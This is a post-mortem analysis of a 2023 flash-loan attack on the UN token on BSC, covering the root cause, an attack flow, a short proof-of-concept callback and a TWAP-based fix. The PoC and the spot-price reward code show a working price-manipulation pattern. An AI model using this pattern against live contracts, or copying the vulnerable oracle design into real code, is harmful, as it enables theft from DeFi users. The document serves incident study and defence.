# UN Token — Flash Loan LP Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2023-06-06 |
| **Protocol** | UN Token |
| **Chain** | BSC |
| **Loss** | ~26K USD |
| **Attacker** | [0xf84efa8a...](https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366) |
| **Attack Contract** | [0x98e241bd...](https://bscscan.com/address/0x98e241bd3be918e0d927af81b430be00d86b04f9) |
| **Attack Tx** | [0xff551526...](https://bscscan.com/tx/0xff5515268d53df41d407036f547b206e288b226989da496fda367bfeb31c5b8b) |
| **Vulnerable Contract** | [0x1aFA48B7...](https://bscscan.com/address/0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F) |
| **Root Cause** | UN token internal function relies on manipulable LP spot price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/UN_exp.sol) |

---
## 1. Vulnerability Overview

The UN token contract uses the spot reserves of the UN/BUSD LP pair as a price reference in its internal reward or swap functions. The attacker borrowed BUSD via a DODO flash loan to manipulate the UN/BUSD LP reserves, then called internal functions at the manipulated price to extract profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Internal calculation based on UN/BUSD LP spot price
contract UN {
    IUniswapV2Pair public pair; // UN/BUSD pair

    function getUNPrice() internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        // ❌ Spot reserves → manipulable via flash loan
        return uint256(reserve1) * 1e18 / uint256(reserve0); // BUSD per UN
    }

    // ❌ Internal reward/swap based on manipulated price
    function claimReward() external {
        uint256 price = getUNPrice();
        uint256 reward = userStake[msg.sender] * price / 1e18;
        busd.transfer(msg.sender, reward); // ❌ Excessive reward
    }
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: UN token internal function relies on manipulable LP spot price
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌──────────────────────────────────────────┐
│  1. Borrow BUSD via DODO flash loan      │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  2. Buy large amount of UN with BUSD     │
│     → UN price spikes (reserve manipulated) │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  3. Call UN internal function (at manipulated price) │
│     → Receive excessive BUSD reward      │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  4. Sell UN back to BUSD + repay flash loan │
│  5. 26K USD profit                       │
└──────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function DPPFlashLoanCallback(address, uint256 amount, uint256, bytes calldata) external {
    // 1. Buy large amount of UN with BUSD
    swapBUSDtoUN(amount * 9 / 10);

    // 2. Call UN internal function at manipulated price
    un.claimReward(); // or other price-dependent functions

    // 3. Sell UN back to BUSD
    swapUNtoBUSD(un.balanceOf(address(this)));

    // 4. Repay flash loan
    busd.transfer(address(DPPOracle), amount);
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | LP spot price oracle manipulation | CRITICAL | CWE-1041 | 04_oracle_manipulation.md |
| V-02 | Flash loan reserve manipulation | HIGH | CWE-682 | 02_flash_loan.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ Use UniswapV2 TWAP or Chainlink oracle
function getUNPrice() internal view returns (uint256) {
    return twapOracle.consult(address(un), 1e18); // 30-minute TWAP
}
```

## 7. Lessons Learned

The pattern of using LP spot prices for reward or swap calculations is the most common target of flash loan attacks. This is a case where the same attacker (0xf84efa8a) attacked multiple protocols in succession — including ARA and UN — suggesting the use of automated tooling to rapidly scan for vulnerable patterns.